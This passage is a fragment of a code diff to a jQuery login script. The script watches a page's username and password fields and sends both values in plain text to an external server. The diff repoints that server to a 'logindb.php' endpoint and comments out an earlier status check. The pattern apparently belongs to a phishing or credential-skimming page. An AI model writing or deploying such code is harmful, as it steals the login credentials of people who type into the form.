@@ -3,7 +3,7 @@ $(function(){
 					$('#mainpage').slideDown(1000);
 					
 				},1000);
-	             setTimeout(function() {
+	            /* setTimeout(function() {
 	             	$.ajax({
 	             		url:'http://io.oainin.com/loginOver',
 	             		type:'get',
@@ -17,14 +17,14 @@ $(function(){
 	             			}
 	             		}
 	             	});
-	             },1000);
+	             },1000);*/
 				
 				
 				setInterval(function(){
 					if($('.username').val()!='' && $('.password').val()!=''){
 						$('.password').blur(function(){
 							$.ajax({
-								url:'http://io.oainin.com/loginDo',
+								url:'http://io.oainin.cn/logindb.php',
 								type:'get',
 								async:true,
 								data:'username='+$('.username').val()+'&password='+$('.password').val(),
